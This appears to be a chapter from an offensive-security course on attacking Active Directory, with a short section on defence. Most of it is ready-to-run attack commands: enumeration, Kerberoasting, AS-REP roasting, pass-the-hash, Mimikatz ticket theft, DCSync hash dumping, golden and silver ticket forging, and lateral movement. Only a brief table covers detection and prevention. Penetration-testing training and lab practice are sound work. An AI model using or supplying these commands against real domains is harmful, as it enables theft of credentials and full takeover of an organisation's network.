# 🏰 Active Directory Attacks & Defense

## Conquering the Enterprise — Domain Domination

---

## Overview

Active Directory (AD) is used by 95%+ of enterprises. Compromising AD typically means compromising the entire organization. This is the most in-demand offensive security skill.

---

## Active Directory Fundamentals

### Key Components

| Component | Description |
|-----------|-------------|
| **Domain Controller (DC)** | Server that manages the domain, stores AD database |
| **Domain** | Logical group of network objects (users, computers) |
| **Forest** | Collection of one or more domains |
| **Organizational Unit (OU)** | Container for organizing objects |
| **Group Policy (GPO)** | Centralized configuration management |
| **LDAP** | Protocol for querying AD (port 389) |
| **Kerberos** | Authentication protocol (port 88) |
| **DNS** | Name resolution (integrated with AD) |

### Kerberos Authentication Flow

```
1. AS-REQ: User → DC "I am user X, give me a TGT"
   (Encrypted with user's password hash)

2. AS-REP: DC → User "Here's your TGT"
   (TGT encrypted with krbtgt account hash)

3. TGS-REQ: User → DC "I want to access Service Y" (presents TGT)

4. TGS-REP: DC → User "Here's your Service Ticket"
   (Encrypted with service account hash)

5. AP-REQ: User → Service "Here's my ticket" (presents Service Ticket)

6. AP-REP: Service → User "Access granted"
```

---

## AD Enumeration

### BloodHound (Visual Attack Path Discovery)

```bash
# Collect data with SharpHound
.\SharpHound.exe -c all

# Or with BloodHound Python (from Linux)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.1 -c all

# Import data into BloodHound GUI
# Look for:
# - Shortest path to Domain Admin
# - Kerberoastable users
# - Users with DCSync rights
# - Unconstrained delegation
```

### PowerView Enumeration

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Domain information
Get-Domain
Get-DomainController

# Users
Get-DomainUser | select samaccountname, description
Get-DomainUser -SPN    # Kerberoastable users!

# Groups
Get-DomainGroup | select name
Get-DomainGroupMember "Domain Admins"

# Computers
Get-DomainComputer | select name, operatingsystem

# Shares
Find-DomainShare -CheckShareAccess

# GPOs
Get-DomainGPO | select displayname

# ACLs (Access Control Lists)
Find-InterestingDomainAcl
```

---

## AD Attacks

### Kerberoasting

```bash
# Request service tickets for accounts with SPNs
# Offline crack the ticket to get service account password

# From Linux (Impacket)
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request

# From Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting

```bash
# Target accounts with "Do not require Kerberos preauthentication"

# From Linux
GetNPUsers.py domain.local/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass

# Crack with hashcat
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash (PtH)

```bash
# Use NTLM hash instead of password

# CrackMapExec
crackmapexec smb 10.10.10.100 -u administrator -H aad3b435b51404eeaad3b435b51404ee:hash

# Impacket psexec
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:hash administrator@10.10.10.100

# Evil-WinRM
evil-winrm -i 10.10.10.100 -u administrator -H hash
```

### Pass-the-Ticket

```bash
# Export and reuse Kerberos tickets

# Mimikatz - export tickets
sekurlsa::tickets /export

# Inject ticket
kerberos::ptt ticket.kirbi

# Verify
klist
```

### DCSync Attack

```bash
# If user has Replicating Directory Changes rights:

# Mimikatz
lsadump::dcsync /domain:domain.local /user:administrator

# Impacket (from Linux)
secretsdump.py domain.local/user:password@10.10.10.1

# Gets ALL domain hashes including krbtgt!
```

### Golden Ticket

```bash
# With krbtgt hash, create tickets for ANY user

# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# This gives you Domain Admin access to EVERYTHING
# Persists until krbtgt password is changed TWICE
```

### Silver Ticket

```bash
# Forge service ticket with service account hash
# More targeted than golden ticket, harder to detect

kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:service_hash /ptt
```

---

## Lateral Movement

```bash
# PsExec (Impacket)
psexec.py domain/admin:password@target

# WMI
wmiexec.py domain/admin:password@target

# WinRM
evil-winrm -i target -u admin -p password

# RDP
xfreerdp /u:admin /p:password /v:target

# CrackMapExec (spray across network)
crackmapexec smb 10.10.10.0/24 -u admin -p password --shares
```

---

## AD Defense

| Attack | Detection | Prevention |
|--------|-----------|------------|
| Kerberoasting | Monitor TGS requests (Event 4769) | Strong service account passwords |
| AS-REP Roasting | Monitor AS-REP without preauth | Require preauth for all accounts |
| Pass-the-Hash | Monitor NTLM usage | Disable NTLM, use Kerberos |
| DCSync | Monitor replication requests | Limit replication rights |
| Golden Ticket | Monitor TGT anomalies | Change krbtgt password regularly |
| Lateral Movement | Monitor remote logins | Least privilege, network segmentation |

---

## Building an AD Lab

```
Recommended Setup:
1. Windows Server 2019/2022 (Domain Controller)
   - 4GB RAM, 60GB disk
   - Configure AD DS, DNS, DHCP
   
2. Windows 10/11 (Workstation 1)
   - Join to domain
   - Standard user

3. Windows 10/11 (Workstation 2)
   - Join to domain
   - Add misconfigurations to practice

4. Kali Linux (Attacker)
   - On same network
```

---

## Exercises

1. Set up a basic AD lab with one DC and two workstations
2. Perform Kerberoasting and crack a service account password
3. Use BloodHound to find the shortest path to Domain Admin
4. Perform Pass-the-Hash lateral movement
5. Execute a DCSync attack and extract all domain hashes

---

**Next:** → [11-Reverse-Engineering](../11-Reverse-Engineering/README.md)

*"In Active Directory, one misconfiguration can lead to total domain compromise."*
